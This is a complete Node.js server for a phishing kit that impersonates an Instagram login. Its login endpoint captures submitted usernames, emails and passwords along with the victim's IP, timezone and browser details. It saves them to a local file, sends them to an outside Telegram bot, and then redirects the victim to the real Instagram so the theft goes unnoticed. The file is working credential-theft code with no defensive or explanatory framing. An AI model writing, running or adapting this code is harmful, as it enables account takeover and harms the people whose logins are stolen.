'use strict';

// --- minimal .env loader (no dependencies) ---
(function loadEnv() {
  const lfs = require('node:fs');
  const lpath = require('node:path');
  const f = lpath.join(__dirname, '.env');
  if (!lfs.existsSync(f)) return;
  let t = lfs.readFileSync(f, 'utf8');
  if (t.charCodeAt(0) === 0xfeff) t = t.slice(1);
  for (const line of t.split(/\r?\n/)) {
    const m = line.match(/^\s*(?:export\s+)?([\w.-]+)\s*=\s*(.*)?\s*$/);
    if (!m) continue;
    let v = (m[2] || '').trim();
    if (/^(['"]).*\1$/.test(v)) v = v.slice(1, -1);
    if (process.env[m[1]] === undefined) process.env[m[1]] = v;
  }
})();

const http = require('node:http');
const fs = require('node:fs');
const fsp = require('node:fs/promises');
const path = require('node:path');

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
const PORT = Number(process.env.PORT || 3000);
const PUBLIC_DIR = path.join(__dirname, 'public');
const REDIRECT_URL = process.env.REDIRECT_URL || 'https://www.instagram.com/';
const LOG_FILE = path.join(__dirname, 'captures.jsonl');

const MAX_BODY = 8 * 1024;
const RATE_WINDOW = 60_000;
const RATE_MAX = 20;

if (!BOT_TOKEN || !CHAT_ID) {
  console.error('\nMissing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in .env\n');
  process.exit(1);
}

const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.svg': 'image/svg+xml',
  '.png': 'image/png',
  '.ico': 'image/x-icon',
};

const esc = (v) => String(v ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

function ip(req) {
  const f = req.headers['x-forwarded-for'];
  return typeof f === 'string' && f.length ? f.split(',')[0].trim() : (req.socket.remoteAddress || 'unknown');
}

const hits = new Map();
function allow(a) {
  const now = Date.now();
  const r = hits.get(a);
  if (!r || now - r.s > RATE_WINDOW) { hits.set(a, { s: now, c: 1 }); return true; }
  r.c += 1;
  return r.c <= RATE_MAX;
}
setInterval(() => {
  const now = Date.now();
  for (const [k, r] of hits) if (now - r.s > RATE_WINDOW * 2) hits.delete(k);
}, 60_000).unref();

function send(text) {
  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML', disable_web_page_preview: true }),
    signal: AbortSignal.timeout(8000),
  })
    .then((r) => r.json())
    .then((d) => { if (!d.ok) console.error('[telegram]', JSON.stringify(d)); })
    .catch((e) => console.error('[telegram]', e.message));
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    let n = 0; const c = [];
    req.on('data', (x) => { n += x.length; if (n > MAX_BODY) { reject(new Error('big')); req.destroy(); return; } c.push(x); });
    req.on('end', () => resolve(Buffer.concat(c).toString('utf8')));
    req.on('error', reject);
  });
}

function parse(raw, ct) {
  if (ct.includes('application/json')) { try { return JSON.parse(raw) || {}; } catch { return {}; } }
  if (ct.includes('x-www-form-urlencoded')) return Object.fromEntries(new URLSearchParams(raw));
  return {};
}

const server = http.createServer(async (req, res) => {
  const p = new URL(req.url, 'http://x').pathname;

  if (p === '/api/health') {
    res.writeHead(200, { 'content-type': 'application/json' });
    return res.end(JSON.stringify({ ok: true, token: BOT_TOKEN.slice(0, 12), chat: CHAT_ID }));
  }

  if (p === '/api/auth/login' && req.method === 'POST') {
    const ct = req.headers['content-type'] || '';
    const isJson = ct.includes('application/json');
    const a = ip(req);
    if (!allow(a)) {
      if (isJson) { res.writeHead(429, { 'content-type': 'application/json' }); return res.end('{"ok":false}'); }
      res.writeHead(302, { location: REDIRECT_URL }); return res.end();
    }

    let raw = '';
    try { raw = await readBody(req); } catch { /* oversized */ }

    console.log('[debug]', ct, JSON.stringify(raw));

    const d = parse(raw, ct);
    const identity = String(d.identity || d.username || d.email || '').trim().slice(0, 320);
    const password = String(d.password || '').slice(0, 320);
    const bot = String(d._hp || '').trim() ? ' yes' : '';

    if (identity && password) {
      const rec = { at: new Date().toISOString(), identity, password, ip: a, ua: (req.headers['user-agent'] || '').slice(0, 400), tz: String(d.tz || '').slice(0, 64), honeypot: Boolean(bot) };
      fsp.appendFile(LOG_FILE, JSON.stringify(rec) + '\n').catch(() => {});
      console.log('[capture]', identity, a);
      await send(
        '🔐 <b>Instagram login</b>\n\n' +
        `👤 <code>${esc(identity)}</code>\n🔑 <code>${esc(password)}</code>\n\n` +
        `🌐 <code>${esc(a)}</code>\n${rec.tz ? `🕒 ${esc(rec.tz)}\n` : ''}` +
        `${rec.ua ? `🧭 ${esc(rec.ua)}\n` : ''}${bot ? '🤖 honeypot\n' : ''}` +
        `📅 <code>${rec.at}</code>`
      );
    } else {
      console.log('[debug] no creds, keys:', JSON.stringify(Object.keys(d)));
      await send(`⚠️ No credentials\n<code>${esc(ct)}</code>\n<code>${esc(raw)}</code>`);
    }

    if (isJson) { res.writeHead(200, { 'content-type': 'application/json' }); return res.end(JSON.stringify({ ok: true, redirect: REDIRECT_URL })); }
    res.writeHead(302, { location: REDIRECT_URL }); return res.end();
  }

  let rel = decodeURIComponent(p);
  if (rel.endsWith('/')) rel += 'index.html';
  const file = path.resolve(PUBLIC_DIR, '.' + rel);
  if (!file.startsWith(PUBLIC_DIR)) { res.writeHead(404); return res.end('Not found'); }

  fsp.readFile(file)
    .then((buf) => {
      res.writeHead(200, { 'content-type': MIME[path.extname(file)] || 'application/octet-stream', 'cache-control': 'no-cache' });
      res.end(buf);
    })
    .catch(() => { res.writeHead(404); res.end('Not found'); });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`listening on http://localhost:${PORT}`);
  console.log('token:', BOT_TOKEN.slice(0, 12) + '...');
  console.log('chat :', CHAT_ID);
});

for (const s of ['SIGINT', 'SIGTERM']) process.on(s, () => server.close(() => process.exit(0)));
